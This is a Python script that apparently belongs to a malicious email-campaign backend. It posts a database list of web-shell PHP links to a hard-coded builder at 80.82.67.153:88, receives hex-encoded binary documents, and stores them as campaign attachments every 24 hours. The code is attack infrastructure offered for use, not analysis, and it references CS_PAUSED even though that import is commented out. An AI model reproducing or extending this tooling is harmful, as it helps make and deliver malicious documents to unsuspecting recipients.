import tracemalloc
import socket, requests, time, datetime, threading
import concurrent.futures
from includes.RootLogger import rootLogger
from includes.patch import patch
import includes.Database as db
# from includes.CampaignThread import CS_CREATED, CS_PROCESSING, CS_PAUSED, CS_HIBERNATED, CS_COMPLETED, CS_DELETED

import traceback
import random
import ssl
import re

import sys
import string
import os

from dotenv import load_dotenv
from os.path import join, dirname
import redis
import json


def getNewDoc(host_ip='80.82.67.153:88', links=[]):


    header = {
                'Host': f'{host_ip}',
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) Gecko/20100101 Firefox/56.0 Waterfox/56.3',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Pragma': 'no-cache',
                'Cache-Control': 'no-cache'
            }

    data = { "url": str(links) , "mode":"newdoc"}
    hex_inf = requests.post(f"http://{host_ip}/builder_doc/", headers=header, data=data).text

    bin_inf = bytes.fromhex(hex_inf)
    return bin_inf

def createNewCampaign(name='universalio', _conn=None):
    # create campaign with all necessearly functions
    db.createCampaign(title=name, _conn=_conn)
    return getCommonCampaign(name, _conn=_conn)

def getCommonCampaign(name='universalio', _conn=None):
    # get campaign after creation
    db_campaign = next(db.getCampaigns(status=None, name=name, _conn=_conn), None)
    return db_campaign

def processCampaign(name='universalio', _redis=None, _conn=None):
    db_campaign = getCommonCampaign(name, _conn=_conn)

    if db_campaign:
        rootLogger.info(f"[processCampaign]: campaign allready created.")
    else:
        rootLogger.info(f"[processCampaign]: no campaign created, creating new.")
        db_campaign = createNewCampaign(_conn=_conn)
        db.updateCampaigns([{'_id': db_campaign.id, 'status': CS_PAUSED, 'workers': 0, 'reply_days': 30, 'updated_at': datetime.datetime.utcnow()}], _conn=_conn)

    return db_campaign


if __name__ == "__main__":
    db_campaign = processCampaign()
    links = [[item.php_url, item.export_name] for item in  db.getShellLinks()]

    rootLogger.info(f"[Main] links:{links}")

    for i in range(10):
        doc_bin = getNewDoc(links=links)
        db.insertCampaignAttachement(binary_data=doc_bin, camp_id=db_campaign.id, _group='universalio', _conn=None)

    rootLogger.info(f"[Main] done, sleep 24hrs and try again.")
    time.sleep( 24*60*60 )
